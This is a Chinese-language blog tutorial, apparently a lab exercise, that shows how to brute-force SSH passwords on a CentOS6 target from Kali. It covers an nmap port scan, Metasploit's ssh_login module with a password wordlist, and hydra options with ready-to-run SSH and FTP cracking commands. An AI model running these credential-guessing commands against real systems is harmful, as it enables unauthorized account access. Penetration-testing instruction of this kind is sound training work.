---
title: Kali Msfconsole工具SSH爆破
tags:
  - Kali
  - 爆破
  - 渗透
categories:
  - Linux
  - Kali
  - 渗透
  - Msfconsole
cover: >-
  https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimages2017.cnblogs.com%2Fblog%2F624934%2F201708%2F624934-20170822153942324-150226464.png&refer=http%3A%2F%2Fimages2017.cnblogs.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1638620254&t=405e68a7b088dc8644a8bf880043eb61
abbrlink: b6515f89
---







### SSH爆破

靶机：CentOS6

攻击机：Kali

```
打开CentOS6，打开终端输入ifconfig查看IP
```

![](https://www.helloimg.com/images/2021/10/26/CgR7fv.png)

扫描CentOS6

```
nmap -p- 172.16.1.109
发现有个22端口SSH，可以尝试爆破
```

![](https://www.helloimg.com/images/2021/10/26/CgRUPX.png)

```
打开kali终端输入msfconsole
输入 search ssh_login		查找SSH爆破所用模块
```

![](https://www.helloimg.com/images/2021/10/26/CgR8U9.png)

```
使用模块
use auxiliary/scanner/ssh/ssh_login
```

![](https://www.helloimg.com/images/2021/10/26/CgRgng.png)

```
查看配置项 需要配置USERNAME和PASS_FILE,RHOSTS。USERNAME为用户名，一般为root，admin；PASS_FILE为密码字典，RHOSTS为靶机IP
```

![](https://www.helloimg.com/images/2021/10/26/CgR6TY.png)

```
返回到Kali配置USERNAME，RHOSTS，PASS_FILE
set username root
set rhosts 172.16.1.109
set pass_file /usr/share/metasploit-framework/data/wordlists/adobe_top100_pass.txt		#/usr/***/adobe_top100_pass.txt为密码字典路径，也有其他的
```

![](https://www.helloimg.com/images/2021/10/26/CgRk7M.png)

```
输入run执行，获取到密码123456
```

![](https://www.helloimg.com/images/2021/10/26/CgRIqE.png)



### hydra破解

```
一些参数	注区分大小写
-R		#继续从上次进度接着破解
-S		#采用SSL链接
-s		#PORT 可通过这个参数指定非默认端口
-l		#LOGIN 指定破解的用户，对特定用户破解
-L		#FILE 指定用户名字典
-p		#PASS 小写，指定密码破解，少用，一般采用密码字典
-P		#FILE 大写，指定密码字典
-e		#ns	可选选项，n:空密码试探，s:使用指定用户和密码试探
-C		#FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数
-M		#FILE 指定目标列表文件一行一条
-o		#FILE 指定结果输出文件
-f		#在使用-M参数以后，找到第一对登录名或者密码的时候中止破解
-t		#TASKS 同时运行的线程数，默认为16
-w		#TIME 设置最大超时的时间，单位秒，默认是30s
-v/-V	#显示详细过程
server	#目标IP
service	#指定服务名
OPT		#可选项

使用方法：hydra 参数 IP 服务名

破解SSH:
	hydra -l root -P /usr/share/metasploit-framework/data/wordlists/adobe_top100_pass.txt -t 2 -vV -e ns 172.16.1.1 ssh

破解ftp:
	hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV
```

